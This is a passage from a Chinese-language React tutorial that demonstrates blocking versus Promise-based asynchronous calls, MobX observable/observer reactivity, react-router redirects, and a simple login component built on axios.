<span style="color: #a020f0;">for</span> (<span style="color: #a020f0;">let</span> <span style="color: #a0522d;">d</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">Date</span>().getTime(); <span style="color: #a020f0;">new</span> <span style="color: #228b22;">Date</span>() &lt; d + 5000;); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#27169;&#25311;&#38459;&#22622; 5&#31186;&#65292;CPU100%</span>
</pre>
</div>

<p>
同步
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> {
  BrowserRouter as Router,
  Switch,
  Route,
  Link
} from <span style="color: #8b2252;">"react-router-dom"</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">&#27979;&#35797;&#29992;</span>
<span style="color: #a020f0;">class</span> Service { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#21516;&#27493;</span>
  login(n){
    <span style="color: #a020f0;">for</span> (<span style="color: #a020f0;">let</span> <span style="color: #a0522d;">d</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">Date</span>().getTime(); <span style="color: #a020f0;">new</span> <span style="color: #228b22;">Date</span>() &lt; d + n * 1000;); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#27169;&#25311;&#38459;&#22622;</span>
    <span style="color: #a020f0;">return</span> Math.random();
  }
}

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  state = {
    ret:0
  }
  handleClick(e) {
    console.log(<span style="color: #8b2252;">'&#35843;&#29992;&#24320;&#22987;'</span>)
    console.log(e);
    <span style="color: #a020f0;">let</span> <span style="color: #a0522d;">ret</span> = <span style="color: #008b8b;">this</span>.props.service.login(5); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#21516;&#27493;&#35843;&#29992;</span>
    <span style="color: #008b8b;">this</span>.setState({ret});
    console.log(<span style="color: #8b2252;">'&#35843;&#29992;&#23436;&#25104;'</span>)
  }
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#28857;&#20987;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;&lt;<span style="color: #0000ff;">br</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">      &#32467;&#26524;&#26159; </span>{<span style="color: #008b8b;">this</span>.state.ret}
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span>  <span style="color: #a0522d;">service</span>={<span style="color: #a020f0;">new</span> <span style="color: #228b22;">Service</span>()}/&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>)); 
</pre>
</div>

<p>
访问 <a href="http://localhost:3000">http://localhost:3000</a> 观察，在同步等待5秒内什么也做不了，浏览器对当前页面渲染是单线程的。
</p>




<p>
<b>异步调用</b>
</p>

<p>
方案2：Promise异步执行. 不过看起来不太优雅
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#21487;&#20197;&#22312;src/index.js&#20013;&#20462;&#25913;&#27979;&#35797;&#20195;&#30721;&#22914;&#19979;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">&#27979;&#35797;&#29992;</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">class Service { // &#21516;&#27493;</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">login(n){</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">for (let d = new Date().getTime(); new Date() &lt; d + n * 1000;); // &#27169;&#25311;&#38459;&#22622;</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">return Math.random();</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>
<span style="color: #a020f0;">class</span> Service { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#24322;&#27493;</span>
  login(n, objAppThis){
    <span style="color: #b22222;">// </span><span style="color: #b22222;">setTimeout(()=&gt;)</span>
    <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">new</span> <span style="color: #228b22;">Promise</span>(
      (resolve, reject) =&gt; {
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#27169;&#25311;&#22810;&#23569;&#31186;&#21518;&#25191;&#34892;</span>
        setTimeout(() =&gt; {
          resolve(Math.random() + 100)
        }, n*1000);
      }
    ).then(
      value =&gt; {
        console.log(<span style="color: #8b2252;">'-----------------'</span>)
        objAppThis.setState({
          ret:value
        })
      }
    )
  }
}

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  state = {
    ret:0
  }
  handleClick(e) {
    console.log(<span style="color: #8b2252;">'&#35843;&#29992;&#24320;&#22987;'</span>)
    console.log(e);
    <span style="color: #b22222;">// </span><span style="color: #b22222;">let ret = this.props.service.login(5); // &#21516;&#27493;&#35843;&#29992;</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">this.setState({ret});</span>
    <span style="color: #008b8b;">this</span>.props.service.login(5, <span style="color: #008b8b;">this</span>); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#24322;&#27493;</span>
    console.log(<span style="color: #8b2252;">'&#35843;&#29992;&#23436;&#25104;'</span>)
  }
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#28857;&#20987;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;&lt;<span style="color: #0000ff;">br</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>{<span style="color: #a020f0;">new</span> <span style="color: #228b22;">Date</span>().getTime()}<span style="color: #000000; background-color: #ffffff;"> &#32467;&#26524;&#26159; </span>{<span style="color: #008b8b;">this</span>.state.ret}
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span>  <span style="color: #a0522d;">service</span>={<span style="color: #a020f0;">new</span> <span style="color: #228b22;">Service</span>()}/&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>)); 
</pre>
</div>


<p>
方案3：Mobx实现
</p>
<ul class="org-ul">
<li>observable装饰器：设置被观察者</li>
<li>observer装饰器：设置观察者，将React组件转换为响应式组件</li>
</ul>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">// </span><span style="color: #b22222;">&#21482;&#38656;&#35201;&#35774;&#32622;&#34987;&#35266;&#23519;&#30340;&#21464;&#37327;&#65292;&#35266;&#23519;&#21464;&#37327;&#23601;&#21487;&#20197;&#20102;</span>
@observable ret = 0; <span style="color: #b22222;">// </span><span style="color: #b22222;">&#34987;&#35266;&#23519;&#23545;&#35937;</span>

@observer
...
    console.log(<span style="color: #008b8b;">this</span>.props.service.ret); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#20351;&#29992;&#25165;&#33021;&#34987;&#35266;&#23519;&#21040;</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#21487;&#20197;&#22312;src/index.js&#20013;&#20462;&#25913;&#27979;&#35797;&#20195;&#30721;&#22914;&#19979;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">'mobx'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">&#27979;&#35797;&#29992;</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">class Service { // &#21516;&#27493;</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">login(n){</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">for (let d = new Date().getTime(); new Date() &lt; d + n * 1000;); // &#27169;&#25311;&#38459;&#22622;</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">return Math.random();</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>
<span style="color: #a020f0;">class</span> Service { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#24322;&#27493;</span>
  @observable ret = 0; <span style="color: #b22222;">// </span><span style="color: #b22222;">&#34987;&#35266;&#23519;&#23545;&#35937;</span>
  login(n){
    <span style="color: #b22222;">// </span><span style="color: #b22222;">setTimeout(()=&gt;)</span>
    <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">new</span> <span style="color: #228b22;">Promise</span>(
      (resolve, reject) =&gt; {
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#27169;&#25311;&#22810;&#23569;&#31186;&#21518;&#25191;&#34892;</span>
        setTimeout(() =&gt; {
          resolve(Math.random() + 1000)
        }, n*1000);
      }
    ).then(
      value =&gt; {
        console.log(<span style="color: #8b2252;">'++++++++++++'</span>)
        <span style="color: #b22222;">// </span><span style="color: #b22222;">objAppThis.setState({</span>
        <span style="color: #b22222;">//   </span><span style="color: #b22222;">ret:value</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">})</span>
        <span style="color: #008b8b;">this</span>.ret = value;
        console.log(<span style="color: #008b8b;">this</span>.ret);
      }
    )
  }
}

@observer
<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  <span style="color: #b22222;">// </span><span style="color: #b22222;">state = {</span>
  <span style="color: #b22222;">//   </span><span style="color: #b22222;">ret:0</span>
  <span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>
  handleClick(e) {
    console.log(<span style="color: #8b2252;">'&#35843;&#29992;&#24320;&#22987;'</span>)
    console.log(e);
    <span style="color: #b22222;">// </span><span style="color: #b22222;">let ret = this.props.service.login(5); // &#21516;&#27493;&#35843;&#29992;</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">this.setState({ret});</span>
    <span style="color: #008b8b;">this</span>.props.service.login(2); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#24322;&#27493;</span>
    console.log(<span style="color: #8b2252;">'&#35843;&#29992;&#23436;&#25104;???'</span>)
  }
  render() {
    console.log(<span style="color: #8b2252;">'observer render *********'</span>);
    console.log(<span style="color: #008b8b;">this</span>.props.service.ret); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#20351;&#29992;&#25165;&#33021;&#34987;&#35266;&#23519;&#21040;</span>
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#28857;&#20987;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;&lt;<span style="color: #0000ff;">br</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>{<span style="color: #a020f0;">new</span> <span style="color: #228b22;">Date</span>().getTime()}<span style="color: #000000; background-color: #ffffff;"> &#32467;&#26524;&#26159; </span>{<span style="color: #008b8b;">this</span>.props.service.ret}
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span>  <span style="color: #a0522d;">service</span>={<span style="color: #a020f0;">new</span> <span style="color: #228b22;">Service</span>()}/&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>)); 
</pre>
</div>

<ul class="org-ul">
<li>Service中被观察者ret变化，导致了观察者调用render函数。</li>
<li>被观察者变化不引起渲染的情况：
<ol class="org-ol">
<li>将app中的render中 <code>{this.props.service.ret}</code> 注释 <code>{/* this.props.service.ret */}</code> 。可以看到，如果render中不使用这个被观察者，render函数就不会调用。</li>
</ol></li>
<li><b>注意：在观察者render函数中，一定要使用这个被观察对象。</b></li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-h:60860465-c797-4218-aa59-27a0bd2eb419" class="outline-3">
<h3 id="h:60860465-c797-4218-aa59-27a0bd2eb419">跳转</h3>
<div class="outline-text-3" id="text-h:60860465-c797-4218-aa59-27a0bd2eb419">
<ul class="org-ul">
<li>如果service中ret发生了变化，观察者Login就会被通知到。一般来说，就会跳转到用户界面，需要使用Redirect组件。</li>
</ul>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">// </span><span style="color: #b22222;">&#23548;&#20837;Redirect</span>
<span style="color: #a020f0;">import</span> {Link,Redirect} from <span style="color: #8b2252;">'react-router-dom'</span>;

<span style="color: #b22222;">//</span><span style="color: #b22222;">render&#20989;&#25968;&#20013;return</span>
<span style="color: #a020f0;">return</span> &lt;Redirect to=<span style="color: #8b2252;">"/"</span> /&gt;; <span style="color: #b22222;">//</span><span style="color: #b22222;">to&#34920;&#31034;&#36339;&#36716;&#21040;&#21738;&#37324;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:a100db74-8fa6-4ff8-b88a-378e282bc6cf" class="outline-3">
<h3 id="h:a100db74-8fa6-4ff8-b88a-378e282bc6cf">Login登录功能代码实现</h3>
<div class="outline-text-3" id="text-h:a100db74-8fa6-4ff8-b88a-378e282bc6cf">
<p>
src/service/user.js文件内容
</p>
<ul class="org-ul">
<li>Mobx组件，被观察变量isLogin</li>
</ul>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/service/user.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;">*/</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">import axios from 'axios';</span>
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> UserService {
    @observable isLogin = <span style="color: #008b8b;">false</span>;
    login(username, password) {
        console.log(username, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/login'</span>,
            data:{username, password}
        }).then(
            value =&gt; {
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#25104;&#21151;&#24590;&#20040;&#21150;</span>
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isLogin = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
            }
        );
    }
}
</pre>
</div>

<p>
src/component/login.js文件内容
</p>
<ul class="org-ul">
<li>Mobx组件，观察变量isLogin</li>
</ul>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">src/component/login.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #b22222;">/* </span><span style="color: #b22222;">component/login.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">"../css/login.css"</span>;
<span style="color: #a020f0;">import</span> UserService from <span style="color: #8b2252;">'../service/user'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">service</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component{
    render() {
        <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">_Login</span> <span style="color: #a0522d;">service</span>={service}/&gt;
    }
}

@observer
<span style="color: #a020f0;">class</span> _Login <span style="color: #a020f0;">extends</span> React.Component{
    handleClick(event) {
      console.log(event); <span style="color: #b22222;">// </span><span style="color: #b22222;">window.event</span>
      event.preventDefault();
      console.log(<span style="color: #8b2252;">'click'</span>)
      <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">username</span>, <span style="color: #a0522d;">password</span>] = event.target.form;
      <span style="color: #008b8b;">this</span>.props.service.login(username.value, password.value);
    }
    render() {
        console.log(<span style="color: #8b2252;">'login render ~~~~~'</span>)
        <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.props.service.isLogin) {
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/profile'</span> /&gt;; <span style="color: #b22222;">// </span><span style="color: #b22222;">to&#34920;&#31034;&#36339;&#36716;&#21040;&#21738;&#37324;</span>
        }
        <span style="color: #a020f0;">return</span>(
            &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#36824;&#26410;&#27880;&#20876;&#65311; </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        )
    }
}
</pre>
</div>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> {
  BrowserRouter as Router,
  Switch,
  Route,
  Link
} from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;
<span style="color: #b22222;">// </span><span style="color: #b22222;">import { observable } from 'mobx';</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">import { observer } from 'mobx-react';</span>

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Home</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">About</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Default</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Always</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;&lt;<span style="color: #0000ff;">hr</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#39029;&#33050;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Profile</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#29992;&#25143;&#20449;&#24687;: </span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  <span style="color: #b22222;">// </span><span style="color: #b22222;">exact &#31934;&#30830;&#21305;&#37197;</span>
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">ul</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20027;&#39029;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/login"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/about"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20851;&#20110;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">ul</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/profile"</span> <span style="color: #a0522d;">component</span>={Profile}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span>/&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>)); 

<span style="color: #b22222;">// </span><span style="color: #b22222;">// &#27979;&#35797;&#29992;</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">// class Service { // &#21516;&#27493;</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">//   login(n){</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">//     for (let d = new Date().getTime(); new Date() &lt; d + n * 1000;); // &#27169;&#25311;&#38459;&#22622;</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">//     return Math.random();</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">//   }</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">// }</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">class Service { // &#24322;&#27493;</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">@observable ret = 0; // &#34987;&#35266;&#23519;&#23545;&#35937;</span>
<span style="color: #b22222;">//   </span><span style="color: #b22222;">login(n){</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">// setTimeout(()=&gt;)</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">return new Promise(</span>
<span style="color: #b22222;">//       </span><span style="color: #b22222;">(resolve, reject) =&gt; {</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">// &#27169;&#25311;&#22810;&#23569;&#31186;&#21518;&#25191;&#34892;</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">setTimeout(() =&gt; {</span>
<span style="color: #b22222;">//           </span><span style="color: #b22222;">resolve(Math.random() + 1000)</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">}, n*1000);</span>
<span style="color: #b22222;">//       </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">).then(</span>
<span style="color: #b22222;">//       </span><span style="color: #b22222;">value =&gt; {</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">console.log('++++++++++++')</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">// objAppThis.setState({</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">//   ret:value</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">// })</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">this.ret = value;</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">console.log(this.ret);</span>
